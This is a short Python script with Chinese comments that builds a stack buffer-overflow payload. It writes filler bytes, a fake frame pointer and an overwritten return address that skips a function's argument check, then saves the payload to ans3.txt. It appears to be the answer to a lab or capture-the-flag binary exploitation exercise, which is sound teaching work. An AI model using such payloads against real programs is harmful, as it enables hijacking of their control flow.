FAKE_RBP = 0x403600          # 数据段地址，作为安全的栈帧基址
TARGET_ADDR = 0x40122b       # func1中输出成功信息的起始地址，跳过参数检查

payload = b""
payload += b"A" * 32
payload += struct.pack("<Q", FAKE_RBP)

# 8字节目标地址（覆盖返回地址）
payload += struct.pack("<Q", TARGET_ADDR)

# memcpy复制0x40(64)字节，填充剩余空间
remaining = 64 - len(payload)
if remaining > 0:
    payload += b"B" * remaining

# 保存到ans3.txt
with open("ans3.txt", "wb") as f:
    f.write(payload)
